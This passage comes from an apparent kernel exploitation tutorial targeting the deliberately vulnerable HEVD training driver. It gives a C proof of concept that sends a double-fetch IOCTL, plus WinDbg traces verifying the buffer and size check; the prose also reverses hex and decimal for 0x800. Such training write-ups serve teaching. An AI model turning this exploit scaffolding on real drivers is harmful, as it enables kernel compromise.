<a id="__codelineno-5-3" name="__codelineno-5-3"></a>
<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="cp">#define IOCTL_CODE 0x222037</span>
<a id="__codelineno-5-6" name="__codelineno-5-6"></a>
<a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_USER_DOUBLE_FETCH</span><span class="w"></span>
<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">Buffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">Size</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-11" name="__codelineno-5-11"></a><span class="p">}</span><span class="w"> </span><span class="n">USER_DOUBLE_FETCH</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PUSER_DOUBLE_FETCH</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-12" name="__codelineno-5-12"></a>
<a id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-15" name="__codelineno-5-15"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-17" name="__codelineno-5-17"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-5-18" name="__codelineno-5-18"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-19" name="__codelineno-5-19"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to open driver handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-20" name="__codelineno-5-20"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-21" name="__codelineno-5-21"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-22" name="__codelineno-5-22"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-5-23" name="__codelineno-5-23"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-24" name="__codelineno-5-24"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opened Driver Handle: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-25" name="__codelineno-5-25"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-26" name="__codelineno-5-26"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-27" name="__codelineno-5-27"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-28" name="__codelineno-5-28"></a>
<a id="__codelineno-5-29" name="__codelineno-5-29"></a><span class="kt">void</span><span class="w"> </span><span class="nf">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-5-30" name="__codelineno-5-30"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-31" name="__codelineno-5-31"></a>
<a id="__codelineno-5-32" name="__codelineno-5-32"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-5-33" name="__codelineno-5-33"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">UserBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2048</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-34" name="__codelineno-5-34"></a>
<a id="__codelineno-5-35" name="__codelineno-5-35"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH struct */</span><span class="w"></span>
<a id="__codelineno-5-36" name="__codelineno-5-36"></a><span class="w">    </span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PAGE_NOCACHE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-37" name="__codelineno-5-37"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">PtrUserDoubleFetch</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-5-38" name="__codelineno-5-38"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-39" name="__codelineno-5-39"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-40" name="__codelineno-5-40"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-41" name="__codelineno-5-41"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-42" name="__codelineno-5-42"></a>
<a id="__codelineno-5-43" name="__codelineno-5-43"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH members */</span><span class="w"></span>
<a id="__codelineno-5-44" name="__codelineno-5-44"></a><span class="w">    </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span><span class="w"> </span><span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-45" name="__codelineno-5-45"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-5-46" name="__codelineno-5-46"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-47" name="__codelineno-5-47"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to allocate heap buffer!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-48" name="__codelineno-5-48"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-49" name="__codelineno-5-49"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-50" name="__codelineno-5-50"></a>
<a id="__codelineno-5-51" name="__codelineno-5-51"></a><span class="w">    </span><span class="cm">/* Initialize USER_DOUBLE_FETCH struct members */</span><span class="w"></span>
<a id="__codelineno-5-52" name="__codelineno-5-52"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">UserBuffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-53" name="__codelineno-5-53"></a><span class="w">    </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="w">    </span><span class="o">=</span><span class="w"> </span><span class="n">UserBufferSize</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-54" name="__codelineno-5-54"></a>
<a id="__codelineno-5-55" name="__codelineno-5-55"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="o">-&gt;</span><span class="n">Size</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-5-56" name="__codelineno-5-56"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-57" name="__codelineno-5-57"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error sending IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-58" name="__codelineno-5-58"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-5-59" name="__codelineno-5-59"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-60" name="__codelineno-5-60"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-5-61" name="__codelineno-5-61"></a>
<a id="__codelineno-5-62" name="__codelineno-5-62"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"></span>
<a id="__codelineno-5-63" name="__codelineno-5-63"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-5-64" name="__codelineno-5-64"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] HEVD: Double Fetch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-65" name="__codelineno-5-65"></a>
<a id="__codelineno-5-66" name="__codelineno-5-66"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Opening handle to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-67" name="__codelineno-5-67"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenDriverHandle</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-5-68" name="__codelineno-5-68"></a>
<a id="__codelineno-5-69" name="__codelineno-5-69"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Running exploit function!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-70" name="__codelineno-5-70"></a><span class="w">    </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-5-71" name="__codelineno-5-71"></a><span class="p">}</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>At this point we want to verify that we can interact with the driver and specifically the correct <abbr title="Input Output Control">IOCTL</abbr>. We'll set a breakpoint in our debugger on <code>HEVD!TriggerDoubleFetch</code>. Then we'll run the POC so far and verify that we can interact with the vulnerable function.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
<span class="normal"><a href="#__codelineno-6-2">2</a></span>
<span class="normal"><a href="#__codelineno-6-3">3</a></span>
<span class="normal"><a href="#__codelineno-6-4">4</a></span>
<span class="normal"><a href="#__codelineno-6-5">5</a></span>
<span class="normal"><a href="#__codelineno-6-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">bp</span><span class="w"> </span><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="w"></span>
<a id="__codelineno-6-2" name="__codelineno-6-2"></a>
<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">g</span><span class="w"></span>
<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">hit</span><span class="w"></span>
<a id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b494681c</span><span class="w"> </span><span class="mi">488</span><span class="n">bc4</span><span class="w">          </span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="n">rsp</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<p>Perfect. We can interact with the function. What we'll do now is take a look at the behaviour we mentioned earlier in regards to the size check followed by the copy. In order to do this we'll add a <code>memset()</code> to our POC and set the buffer struct member to be filled with 0x41s. Then we'll set a breakpoint on the function and verify that: </p>
<ol>
<li>our buffer is used </li>
<li>that we can perform the copy from user-mode to kernel-mode as long as we don't violate the size check.</li>
</ol>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Checking our input</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-7-10">10</a></span>
<span class="normal"><a href="#__codelineno-7-11">11</a></span>
<span class="normal"><a href="#__codelineno-7-12">12</a></span>
<span class="normal"><a href="#__codelineno-7-13">13</a></span>
<span class="normal"><a href="#__codelineno-7-14">14</a></span>
<span class="normal"><a href="#__codelineno-7-15">15</a></span>
<span class="normal"><a href="#__codelineno-7-16">16</a></span>
<span class="normal"><a href="#__codelineno-7-17">17</a></span>
<span class="normal"><a href="#__codelineno-7-18">18</a></span>
<span class="normal"><a href="#__codelineno-7-19">19</a></span>
<span class="normal"><a href="#__codelineno-7-20">20</a></span>
<span class="normal"><a href="#__codelineno-7-21">21</a></span>
<span class="normal"><a href="#__codelineno-7-22">22</a></span>
<span class="normal"><a href="#__codelineno-7-23">23</a></span>
<span class="normal"><a href="#__codelineno-7-24">24</a></span>
<span class="normal"><a href="#__codelineno-7-25">25</a></span>
<span class="normal"><a href="#__codelineno-7-26">26</a></span>
<span class="normal"><a href="#__codelineno-7-27">27</a></span>
<span class="normal"><a href="#__codelineno-7-28">28</a></span>
<span class="normal"><a href="#__codelineno-7-29">29</a></span>
<span class="normal"><a href="#__codelineno-7-30">30</a></span>
<span class="normal"><a href="#__codelineno-7-31">31</a></span>
<span class="normal"><a href="#__codelineno-7-32">32</a></span>
<span class="normal"><a href="#__codelineno-7-33">33</a></span>
<span class="normal"><a href="#__codelineno-7-34">34</a></span>
<span class="normal"><a href="#__codelineno-7-35">35</a></span>
<span class="normal"><a href="#__codelineno-7-36">36</a></span>
<span class="normal"><a href="#__codelineno-7-37">37</a></span>
<span class="normal"><a href="#__codelineno-7-38">38</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">bp</span><span class="w"> </span><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0x41</span><span class="w"></span>
<a id="__codelineno-7-2" name="__codelineno-7-2"></a>
<a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">g</span><span class="w"></span>
<a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">hit</span><span class="w"></span>
<a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b494681c</span><span class="w"> </span><span class="mi">488</span><span class="n">bc4</span><span class="w">          </span><span class="n">mov</span><span class="w">     </span><span class="n">rax</span><span class="p">,</span><span class="n">rsp</span><span class="w"></span>
<a id="__codelineno-7-7" name="__codelineno-7-7"></a>
<a id="__codelineno-7-8" name="__codelineno-7-8"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">g</span><span class="w"></span>
<a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hit</span><span class="w"></span>
<a id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0x41</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-7-11" name="__codelineno-7-11"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b494685d</span><span class="w"> </span><span class="n">ff15e5b7f7ff</span><span class="w">    </span><span class="n">call</span><span class="w">    </span><span class="n">qword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">HEVD</span><span class="o">!</span><span class="n">_imp_ProbeForRead</span><span class="w"> </span><span class="p">(</span><span class="n">fffff805</span><span class="err">`</span><span class="n">b48c2048</span><span class="p">)]</span><span class="w"></span>
<a id="__codelineno-7-12" name="__codelineno-7-12"></a>
<a id="__codelineno-7-13" name="__codelineno-7-13"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="w"></span>
<a id="__codelineno-7-14" name="__codelineno-7-14"></a><span class="n">HEVD</span><span class="o">!</span><span class="n">TriggerDoubleFetch</span><span class="o">+</span><span class="mh">0x47</span><span class="o">:</span><span class="w"></span>
<a id="__codelineno-7-15" name="__codelineno-7-15"></a><span class="n">fffff805</span><span class="err">`</span><span class="n">b4946863</span><span class="w"> </span><span class="mi">4</span><span class="n">c8bcf</span><span class="w">          </span><span class="n">mov</span><span class="w">     </span><span class="n">r9</span><span class="p">,</span><span class="n">rdi</span><span class="w"></span>
<a id="__codelineno-7-16" name="__codelineno-7-16"></a>
<a id="__codelineno-7-17" name="__codelineno-7-17"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="n">rdi</span><span class="w"> </span><span class="c1">// (1)</span>
<a id="__codelineno-7-18" name="__codelineno-7-18"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0000</span><span class="w">  </span><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252b0</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000</span><span class="mi">800</span><span class="w"></span>
<a id="__codelineno-7-19" name="__codelineno-7-19"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0010</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-20" name="__codelineno-7-20"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0020</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-21" name="__codelineno-7-21"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0030</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-22" name="__codelineno-7-22"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0040</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-23" name="__codelineno-7-23"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0050</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-24" name="__codelineno-7-24"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0060</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-25" name="__codelineno-7-25"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">389</span><span class="n">b0070</span><span class="w">  </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000000</span><span class="w"></span>
<a id="__codelineno-7-26" name="__codelineno-7-26"></a>
<a id="__codelineno-7-27" name="__codelineno-7-27"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dq</span><span class="w"> </span><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252b0</span><span class="w"></span>
<a id="__codelineno-7-28" name="__codelineno-7-28"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252b0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-29" name="__codelineno-7-29"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252c0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-30" name="__codelineno-7-30"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252d0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-31" name="__codelineno-7-31"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252e0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-32" name="__codelineno-7-32"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a252f0</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-33" name="__codelineno-7-33"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25300</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-34" name="__codelineno-7-34"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25310</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-35" name="__codelineno-7-35"></a><span class="mo">000001</span><span class="mi">8</span><span class="n">c</span><span class="err">`</span><span class="mi">38</span><span class="n">a25320</span><span class="w">  </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"> </span><span class="mi">41414141</span><span class="err">`</span><span class="mi">41414141</span><span class="w"></span>
<a id="__codelineno-7-36" name="__codelineno-7-36"></a>
<a id="__codelineno-7-37" name="__codelineno-7-37"></a><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">kd</span><span class="o">&gt;</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">800</span><span class="w"></span>
<a id="__codelineno-7-38" name="__codelineno-7-38"></a><span class="n">Evaluate</span><span class="w"> </span><span class="n">expression</span><span class="o">:</span><span class="w"> </span><span class="mi">2048</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mo">00000000</span><span class="err">`</span><span class="mo">00000</span><span class="mi">800</span><span class="w"></span>
</code></pre></div></td></tr></table></div>
<ol>
<li>RDI has the address <code>0000018c38a252b0</code> which is a pointer to our buffer.</li>
</ol>
<p>Great, we can verify that our buffer is stored in a pointer that is in the RDI register. We can also see that the decimal value 800 is in RDI also, converting 800 to hex we get the value 2048 which is our size. Now we'll continue stepping through the function and ensure that we pass the size check and as a result perform the copy.</p>
<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Passing the size check</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-8-10">10</a></span>
<span class="normal"><a href="#__codelineno-8-11">11</a></span>
<span class="normal"><a href="#__codelineno-8-12">12</a></span>
<span class="normal"><a href="#__codelineno-8-13">13</a></span>
<span class="normal"><a href="#__codelineno-8-14">14</a></span>
<span class="normal"><a href="#__codelineno-8-15">15</a></span>
<span class="normal"><a href="#__codelineno-8-16">16</a></span>
